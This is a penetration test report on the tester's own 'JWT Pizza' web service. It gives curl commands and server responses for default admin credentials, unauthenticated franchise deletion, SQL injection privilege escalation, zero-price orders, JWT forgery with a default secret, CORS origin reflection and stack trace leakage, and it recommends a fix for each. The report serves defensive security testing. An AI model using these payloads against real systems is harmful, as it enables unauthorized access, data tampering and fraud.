# Self-Attack Records — JWT Pizza Penetration Test

**Tester:** Jay Ellis
**Date:** April 11, 2026
**Target:** pizza-service.urjellis.com / pizza.urjellis.com

---

## Attack 1 — Default Admin Credentials

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A07 Identification and Authentication Failures                |
| Severity       | 4                                                             |
| Description    | Attempted login with the default admin credentials hardcoded  |
|                | in the source code (`a@jwt.com` / `admin`). The login         |
|                | succeeded, granting full admin access including the ability   |
|                | to list all users, create/delete franchises, and manage       |
|                | stores. These credentials are visible in `notes.md` and       |
|                | `database.js` in the source repository.                       |
| Images         | See below                                                     |
| Corrections    | 1) Change the default admin password on first deployment.     |
|                | 2) Remove hardcoded credentials from source code.             |
|                | 3) Implement a first-run setup flow that forces a password    |
|                | change. 4) Add rate limiting specifically on the login        |
|                | endpoint.                                                     |

**Request:**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@jwt.com","password":"admin"}'
```

**Response (admin access granted):**

```json
{
  "user": {
    "id": 1,
    "name": "常用名字",
    "email": "a@jwt.com",
    "roles": [{ "role": "admin" }]
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6IuW4uOeUqOWQjeWtlyIsImVtYWlsIjoiYUBqd3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJhZG1pbiJ9XSwiaWF0IjoxNzc1OTMwMzQ1fQ.t8dhUTwW76HCBq-BRdrC4VSlzWe-zH-khNvLwEGq_Ek"
}
```

**Admin capabilities confirmed:**

```bash
# List all franchises with admin details (revenue, admin emails)
curl -s https://pizza-service.urjellis.com/api/franchise \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

```json
{
  "franchises": [
    {
      "id": 1,
      "name": "pizzaPocket",
      "admins": [{ "id": 3, "name": "pizza franchisee", "email": "f@jwt.com" }],
      "stores": [{ "id": 1, "name": "SLC", "totalRevenue": 2658.5101 }]
    }
  ],
  "more": false
}
```

---

## Attack 2 — Unauthenticated Franchise Deletion

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A01 Broken Access Control                                     |
| Severity       | 4                                                             |
| Description    | The `DELETE /api/franchise/:franchiseId` endpoint has NO       |
|                | authentication middleware. Any anonymous, unauthenticated      |
|                | user on the internet can delete any franchise by sending a     |
|                | DELETE request. First created a test franchise (ID 2) using    |
|                | admin credentials, then successfully deleted it with NO        |
|                | Authorization header whatsoever.                               |
| Images         | See below                                                     |
| Corrections    | Add `authRouter.authenticateToken` middleware to the DELETE    |
|                | franchise route in `franchiseRouter.js`, and add an admin     |
|                | role check (`if (!req.user.isRole(Role.Admin)) return         |
|                | res.status(403)...`).                                         |

**Setup — Created test franchise with admin token:**

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/franchise \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"PentestFranchise_DELETE_ME","admins":[{"email":"pentest@test.com"}]}'
```

```json
{
  "name": "PentestFranchise_DELETE_ME",
  "admins": [{ "email": "pentest@test.com", "id": 5, "name": "pentest_user" }],
  "id": 2
}
```

**Attack — DELETE with NO authentication:**

```bash
curl -s -X DELETE https://pizza-service.urjellis.com/api/franchise/2 \
  -w "\nHTTP_CODE: %{http_code}"
```

```
{"message":"franchise deleted"}
HTTP_CODE: 200
```

**Verification — Franchise is gone:**

```json
{
  "franchises": [{ "id": 1, "name": "pizzaPocket", "stores": [{ "id": 1, "name": "SLC" }] }],
  "more": false
}
```

---

## Attack 3 — SQL Injection via User Update

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A03 Injection                                                 |
| Severity       | 4                                                             |
| Description    | The `PUT /api/user/:userId` endpoint uses string              |
|                | concatenation (not parameterized queries) to build SQL        |
|                | UPDATE statements. By injecting `admin'-- ` in the `name`    |
|                | field, the WHERE clause was commented out, causing the        |
|                | UPDATE to modify the **admin account** (user ID 1) instead   |
|                | of the authenticated user (ID 5). The server returned an      |
|                | admin-role JWT, effectively granting privilege escalation      |
|                | from diner to admin. Additionally, error-based payloads       |
|                | revealed full SQL query structure, table names, and column    |
|                | names through stack traces.                                   |
| Images         | See below                                                     |
| Corrections    | 1) Use parameterized queries (`?` placeholders) in            |
|                | `database.js:updateUser()`. 2) Never concatenate user input   |
|                | into SQL strings. 3) Disable stack trace exposure in          |
|                | production error responses.                                   |

**Payload 1 — SQL comment injection in name field (CRITICAL: privilege escalation):**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/5 \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"email":"test@test.com","name":"admin'\''-- "}'
```

```json
{
  "user": {
    "id": 1,
    "name": "admin",
    "email": "test@test.com",
    "roles": [{ "role": "admin" }]
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJhZG1pbiJ9XSwiaWF0IjoxNzc1OTMwMzc3fQ.zumDSP9VKV5FNyuE6-m9psSn1ivxYz8YttkThz857ks"
}
```

> A normal diner user (ID 5) sent this request but received back an **admin JWT for user ID 1**. The SQL comment (`-- `) truncated the WHERE clause, causing the UPDATE to hit the admin row.

**Payload 2 — UNION-based injection reveals SQL structure:**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/5 \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"email":"x'\'' UNION SELECT id,name,email,password FROM user WHERE '\''1'\''='\''1","password":"pentestPass123"}'
```

```json
{
  "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT id,name,email,password FROM user WHERE '1'='1' WHERE id=5' at line 1",
  "stack": "Error: You have an error in your SQL syntax...\n    at PromisePoolConnection.execute (/usr/src/app/node_modules/mysql2/promise.js:112:22)\n    at DB.query (/usr/src/app/database/database.js:416:40)\n    at DB.updateUser (/usr/src/app/database/database.js:122:20)..."
}
```

> Error reveals: MySQL database, table name `user`, column names, file paths (`/usr/src/app/database/database.js`), and confirms unparameterized queries.

---

## Attack 4 — Order Pizza for $0 (Client-Side Price Manipulation)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A04 Insecure Design                                           |
| Severity       | 3                                                             |
| Description    | The server accepts order prices directly from the client      |
|                | without validating them against the menu database. Submitted  |
|                | an order for a Veggie pizza at price 0.0001 (real price:      |
|                | 0.0038) and the order was accepted. The pizza factory even    |
|                | issued a valid verification JWT for the fraudulent order. An  |
|                | attacker can order unlimited pizzas for essentially free.     |
| Images         | See below                                                     |
| Corrections    | Server-side price validation: look up the actual price from   |
|                | the `menu` table using the `menuId` and ignore the            |
|                | client-supplied `price` field entirely.                       |

**Menu shows real prices:**

```json
[
  { "id": 1, "title": "Veggie", "price": 0.0038, "description": "A garden of delight" },
  { "id": 2, "title": "Pepperoni", "price": 0.0042, "description": "Spicy treat" },
  { "id": 3, "title": "Margarita", "price": 0.0042, "description": "Essential classic" }
]
```

**Attack — Submit order with manipulated price:**

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":1,"description":"Veggie","price":0.0001}]}'
```

**Response (order accepted at fraudulent price):**

```json
{
  "order": {
    "franchiseId": 1,
    "storeId": 1,
    "items": [{ "menuId": 1, "description": "Veggie", "price": 0.0001 }],
    "id": 20246
  },
  "jwt": "eyJpYXQiOjE3NzU5MzA0NjQsImV4cCI6MTc3NjAxNjg2NCwiaXNzIjoiY3MzMjkuY2xpY2siLCJhbGciOiJSUzI1NiIsImtpZCI6Ik9TcF94VzhlM3kwNk1KS3ZIeW9sRFZMaXZXX2hnTWxhcFZSUVFQVndiY0UifQ..."
}
```

> The pizza factory issued a valid signed JWT for this order, confirming the fraud was fully processed.

---

## Attack 5 — JWT Forgery with Default Secret

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A02 Cryptographic Failures                                    |
| Severity       | 0                                                             |
| Description    | The source code `.env` file contains                          |
|                | `JWT_SECRET=dev-secret-key-change-in-production`. Attempted   |
|                | to forge an admin JWT using this default secret and also      |
|                | attempted an `alg:none` attack. Both forged tokens were       |
|                | rejected by the production server, indicating the JWT secret  |
|                | was changed for production deployment. The vulnerability      |
|                | exists in the source code but is not exploitable in this      |
|                | deployment.                                                   |
| Images         | See below                                                     |
| Corrections    | 1) Remove the default secret from `.env` — use               |
|                | environment-variable-only injection. 2) Add `.env` to         |
|                | `.gitignore`. 3) Use a cryptographically random secret of at  |
|                | least 256 bits. 4) Add JWT expiration (`expiresIn`) to token  |
|                | signing.                                                      |

**Forged token with default secret:**

```bash
node -e "
const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
  {id:1, name:'admin', email:'a@jwt.com', roles:[{role:'admin'}]},
  'dev-secret-key-change-in-production'
);
console.log(forgedToken);
"
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJhQGp3dC5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImFkbWluIn1dLCJpYXQiOjE3NzU5MzA1MTZ9.wvZLlc9RrEfw5rneLtBrqfwvyV2xzRNdV8IGmECEhxk
```

**Test forged token:**

```bash
curl -s https://pizza-service.urjellis.com/api/user/me \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

```json
{ "message": "unauthorized" }
```

**alg:none attack also rejected:**

```json
{ "message": "unauthorized" }
```

---

## Attack 6 — CORS Origin Reflection (Bonus)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A05 Security Misconfiguration                                 |
| Severity       | 3                                                             |
| Description    | The server reflects ANY `Origin` header as                    |
|                | `Access-Control-Allow-Origin` with                            |
|                | `Access-Control-Allow-Credentials: true`. This means any      |
|                | malicious website can make authenticated cross-origin          |
|                | requests to the pizza API, stealing user data or performing   |
|                | actions on their behalf. A phishing site could silently order |
|                | pizzas, delete franchises, or exfiltrate user tokens.         |
| Images         | See below                                                     |
| Corrections    | Configure CORS to allow only the specific frontend origin     |
|                | (`https://pizza.urjellis.com`). Never reflect arbitrary       |
|                | origins with `credentials: true`.                             |

**Request from malicious origin:**

```bash
curl -s -D- -o /dev/null https://pizza-service.urjellis.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

**Response headers (origin reflected):**

```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: GET, POST, PUT, DELETE
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> The attacker's origin is echoed back verbatim with credentials allowed, enabling full cross-origin exploitation.

---

## Attack 7 — Stack Trace / Information Disclosure (Bonus)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 11, 2026                                                |
| Target         | pizza-service.urjellis.com                                    |
| Classification | A05 Security Misconfiguration                                 |
| Severity       | 2                                                             |
| Description    | Error responses include full Node.js stack traces, exposing   |
|                | internal file paths, dependency versions, database driver     |
|                | details, and application structure. An attacker can use this  |
|                | to map the internal architecture and plan targeted attacks.   |
|                | This was observed in both the JSON parse error and the SQL    |
|                | injection error responses.                                    |
| Images         | See below                                                     |
| Corrections    | Set `NODE_ENV=production` and configure the Express error     |
|                | handler to omit `stack` from responses in production. Only    |
|                | log stack traces server-side.                                 |

**Trigger — Send malformed JSON:**

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d 'not json'
```

**Response (stack trace leaked):**

```json
{
  "message": "Unexpected token 'n', \"not json\" is not valid JSON",
  "stack": "SyntaxError: Unexpected token 'n', \"not json\" is not valid JSON\n    at JSON.parse (<anonymous>)\n    at createStrictSyntaxError (/usr/src/app/node_modules/body-parser/lib/types/json.js:169:10)\n    at parse (/usr/src/app/node_modules/body-parser/lib/types/json.js:86:15)\n    at /usr/src/app/node_modules/body-parser/lib/read.js:128:18\n    at AsyncResource.runInAsyncScope (node:async_hooks:214:14)\n    at invokeCallback (/usr/src/app/node_modules/raw-body/index.js:238:16)\n    at done (/usr/src/app/node_modules/raw-body/index.js:227:7)\n    at IncomingMessage.onEnd (/usr/src/app/node_modules/raw-body/index.js:287:7)"
}
```

> Reveals: Node.js runtime, body-parser module, raw-body module, file path prefix `/usr/src/app/` (Docker container).

---

## Summary of Findings

| #   | Attack                             | OWASP Category                | Severity | Exploitable? |
| --- | ---------------------------------- | ----------------------------- | -------- | ------------ |
| 1   | Default Admin Credentials          | A07 Authentication Failures   | 4        | YES          |
| 2   | Unauthenticated Franchise Deletion | A01 Broken Access Control     | 4        | YES          |
| 3   | SQL Injection (Priv. Escalation)   | A03 Injection                 | 4        | YES          |
| 4   | Zero-Price Order                   | A04 Insecure Design           | 3        | YES          |
| 5   | JWT Forgery (Default Secret)       | A02 Cryptographic Failures    | 0        | NO (patched) |
| 6   | CORS Origin Reflection             | A05 Security Misconfiguration | 3        | YES          |
| 7   | Stack Trace Disclosure             | A05 Security Misconfiguration | 2        | YES          |

## Recommended Code Fixes

### Critical Priority

1. **SQL Injection** (`database.js:updateUser`): Replace string concatenation with parameterized queries using `?` placeholders for all user-supplied values.
2. **Unauthenticated Franchise Deletion** (`franchiseRouter.js`): Add `authRouter.authenticateToken` middleware and admin role check to the DELETE `/api/franchise/:franchiseId` route.
3. **Default Admin Credentials** (`database.js`): Change the default admin password, or implement a first-run setup that forces password change.

### High Priority

4. **Server-Side Price Validation** (`orderRouter.js`): Look up menu item prices from the database by `menuId` instead of trusting client-supplied prices.
5. **CORS Lockdown** (`service.js`): Replace origin reflection with an allowlist containing only the production frontend URL.
6. **Stack Trace Suppression** (`service.js`): Set `NODE_ENV=production` and remove `err.stack` from error response payloads.
7. **JWT Expiration** (`authRouter.js`): Add `expiresIn: '1h'` (or similar) to `jwt.sign()` calls.
